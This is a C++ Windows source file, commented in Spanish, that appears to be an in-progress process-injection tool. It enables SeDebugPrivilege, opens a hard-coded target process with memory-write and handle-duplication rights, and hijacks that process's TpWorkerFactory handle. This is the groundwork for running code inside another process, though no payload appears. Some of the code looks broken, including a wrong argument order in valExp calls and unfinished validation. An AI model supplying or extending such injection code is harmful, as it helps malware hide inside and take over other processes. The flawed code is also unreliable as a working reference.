#define PHNT_VERSION PHNT_THRESHOLD // Windows 10
#include<phnt_windows.h>
#include<phnt.h>
#include<iostream>
#include<vector>
#include <type_traits>
#pragma comment(lib, "ntdll")

using namespace std;

template <typename TReturn>
bool BAD_PTR(TReturn ptr) {
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    bool b;
    void* p = (void*)ptr;
    if (::VirtualQuery(p, &mbi, sizeof(mbi))) {
        DWORD mask = (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY);
        b = !(mbi.Protect & mask);
        // check the page is not a guard page
        if (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) b = true;

        if (b) {
            return false;
        }
        else {
            return true;
        }
    }

    cout << "\nBAD_PTR: VirtualQuery no funciono en:" << ptr;
    return false;
}

enum VALIDATE_FUNC {
    CHECK_FALSE_NULL,
    CHECK_NTSTATUS,
    CHECK_BAD_PTR,
    CHECK_HANDLE,
    NO_CHECK
};
template <typename ArgT>
ArgT valExp(VALIDATE_FUNC validateFunc, const char* id, ArgT expression) {
    if (validateFunc == CHECK_FALSE_NULL && 
        (typeid(expression) == typeid(bool) ||
         typeid(expression) == typeid(BOOL))) { //Solo funciona si la func retorna BOOL o bool
        if (!expression) {
            cout << "\nFalse or Null Value: " << expression << ", id: " << id << ", GetLastError: " << std::dec << GetLastError();
            abort();
        }
    }
    else if (validateFunc == CHECK_NTSTATUS &&
             typeid(expression) == typeid(NTSTATUS)) {
        if (!NT_SUCCESS(expression)) {
            cout << "\nNTSTATUS: " << expression << ", id: " << id;
            abort();
        }
    }
    else if (validateFunc == CHECK_BAD_PTR &&
             is_pointer_v<ArgT>) {
        if (BAD_PTR(expression)) {
            cout << "\nBad-Pointer:" << expression << ",  GetLastError:" << std::dec << GetLastError(); //Usamos std::dec para convertir la DWORD de GetLastError en decimal, los errores documentados en msdn estan en decimal (y hexadecimal entre parentesis)
            abort();
        }
    }
    else if (validateFunc == CHECK_HANDLE) {

    }

    return expression;
}

void validateArgs() {}
template <typename FirstT, typename... RestT>
void validateArgs(const char* id, FirstT first, RestT... rest) {
    if (typeid(first) == typeid(HANDLE)) {
        valExp<HANDLE>(first, CHECK_HANDLE, id);
    }
    else if (is_pointer_v<FirstT>) {
        valExp<FirstT>(first, CHECK_BAD_PTR, id);
    }

    validateArgs(id, rest...);
}

template <typename FuncT, typename... ArgsT> //Para declarar templates que devuelven cualquier tipo usamos auto
auto val(VALIDATE_FUNC returnValidateFunc, const char* skipArgValidate, const char* id, FuncT func, ArgsT... args) {
    validateArgs(id, args...); //Falta implementar skipArgValidate

    auto res = func(args...); //Con auto no podemos usar NULL, debemos usar el tipo correcto para los argumentos

    valExp(returnValidateFunc, id, res);

    return res;
}

template <class FuncT, class... ArgsT> //Si las funciones a validar son templates, es muy dificil crear una funcion template que acepte otros templates, ademas tendriamos que definir una nueva funcion para cada nuevo template usado, entonces es mejor llamar la funcion desde afuera y que esta funcion solo tome el resultado
FuncT valTemplate(VALIDATE_FUNC returnValidateFunc, const char* skipArgValidate, const char* id, FuncT call, ArgsT... args) {
    validateArgs(id, args...); //Falta implementar skipArgValidate

    valExp(returnValidateFunc, id, call);

    return call;
}
#define valTemp(returnValidateFunc, skipArgValidate, id, func, ...) valTemplate(returnValidateFunc, skipArgValidate, id, func(__VA_ARGS__), __VA_ARGS__);

typedef struct __PUBLIC_OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG Reserved[22];    // reserved for internal use
} PUBLIC_OBJECT_TYPE_INFORMATION, * PPUBLIC_OBJECT_TYPE_INFORMATION;


template <typename TFunc, typename TInfoClass>
vector<BYTE> queryInfo(HANDLE hProcess, TFunc queryFunc, TInfoClass processInfoClass) {        //QueryFUnctionArgs son *p_hTarget y ProcessHandleInformation=51 de la funcion llamada en handleHijacker.cpp
	ULONG InformationLength = 0;                 //Tratamos de adivinar el tamano de la struct de informacion
	auto Ntstatus = STATUS_INFO_LENGTH_MISMATCH; //El bucle se ejecuta mientras haya un error de mistmatch
	std::vector<BYTE> Information;               //Guarda los bytes de la struct information

	do
	{
		Information.resize(InformationLength);         //En cada iteracion se cambia el tamano de la variable Information al valor que le puso la queryFunc a InformationLength
		Ntstatus = queryFunc(hProcess, processInfoClass, Information.data(), InformationLength, &InformationLength);  //Simplemente llama a la funcion NtQueryInformationProcess, no se porque puso la funcion como parametro.  Envia la direccion de la InformationLength modificar su tamano
	} while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus); //Ejecuta el bucle mientras no se recupere la info del proceso

    valExp(CHECK_NTSTATUS, "1", Ntstatus);

	return Information;
}

HANDLE hijackProcessHandle(wstring wsObjectType, HANDLE hTarget, DWORD dwDesiredAccess) {
	vector<BYTE> pProcessInfo = valTemp(NO_CHECK,"","2.5",      queryInfo,hTarget,NtQueryInformationProcess,ProcessHandleInformation);
    const auto pProcessHandleInfo = valExp(CHECK_BAD_PTR,"3",   (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(pProcessInfo.data()) ); //BAD_PTR(pProcessHandleInfo, "3");

    for (auto i = 0; i < pProcessHandleInfo->NumberOfHandles; i++) {   //Se ejecuta mientras el iterador sea menor que el numero de handles del proceso
        HANDLE hDuplicatedObj;
        BOOL res = val(CHECK_FALSE_NULL,"","2",   DuplicateHandle,hTarget,pProcessHandleInfo->Handles[i].HandleValue,GetCurrentProcess(),&hDuplicatedObj,dwDesiredAccess,FALSE,NULL);      //RAISE_FALSE_NULL(res, "2") //Funcion nativa para dupicar handles. Le pasa el handle del proceso a copiarle. Le pasa el handle value del handle a copiar. Le pasa el handle del proceso actual. Le pasa el nivel de acceso y los ultimos dos parametros FALSE y NULL

        vector<BYTE> pObjectInfo = valTemp(NO_CHECK,"","7",   queryInfo,hDuplicatedObj,NtQueryObject,ObjectTypeInformation); //Recupera informacion del handle recien copiado
        auto pObjectTypeInfo = valExp(CHECK_BAD_PTR,"7.5",    (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInfo.data()));      //BAD_PTR(pObjectTypeInfo, "7");  //Accede a los datos crudos del handle recien copiado

        if (wsObjectType != wstring(pObjectTypeInfo->TypeName.Buffer)) { //Compara el nombre de tipo del handle coincide con el valor pasado a esta funcion, si es diferente, el bucle continua
            continue;
        }

        wcout << "\npObjectTypeInfo: " << wstring(pObjectTypeInfo->TypeName.Buffer);
        return hDuplicatedObj; //Regresa el handle en caso de coincidencia
    }

    throw std::runtime_error("Failed to hijack object handle");
}

void setCurrentProcessPrivilege(LPCSTR privilegeStr) {
    HANDLE hToken;
    HANDLE hCurrentProcess = GetCurrentProcess(); //Obtiene un psudohandle, es una ubicacion invalida FFFFFFFF, pero aun asi podemos usar este handle con otras funciones... No debemos validar con BAD_PTR por obvias razones
    BOOL res = val(CHECK_FALSE_NULL,"","10",   OpenProcessToken, hCurrentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);      //RAISE_FALSE_NULL(res, "10");

    LUID luid;
    res = val(CHECK_FALSE_NULL,"","11",   LookupPrivilegeValueA, "", privilegeStr, &luid);     //RAISE_FALSE_NULL(res, "11")

    TOKEN_PRIVILEGES tokenPriv = { 0 };
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //SE_PRIVILEGE_REMOVE elimina el privilegio, este lo habilita

    res = val(CHECK_FALSE_NULL,"","12",   AdjustTokenPrivileges, hToken, FALSE, &tokenPriv, 0, nullptr, nullptr);      //RAISE_FALSE_NULL(res, "12")
}

int main() {
    setCurrentProcessPrivilege("SeDebugPrivilege");
    cout << "\nsetCurrentProcessPrivilege(): Exitoso";
    
	DWORD targetPid = 8616; //Pedir al usuario escribir un pid y verificar si el pid existe
    HANDLE hTarget = val(CHECK_HANDLE,"","13",   OpenProcess, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, targetPid);      //Eliminamos la comprobacion del handle resultado... Talvez los handles no contienen direcciones validas y solo se usan como IDs para pasar a las funciones de la winapi
	
    HANDLE hProp = val(CHECK_HANDLE,"","14",   hijackProcessHandle, wstring(L"TpWorkerFactory"), hTarget, WORKER_FACTORY_ALL_ACCESS);
    cout << "\nThe final hijacked handler address: " << hProp;

    system("pause");

    //Verificar el error de OpenProcess: https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror
    //Obtengo GetLastError = 0, quizas es porque no tengo activado SeDebugPrivilege
}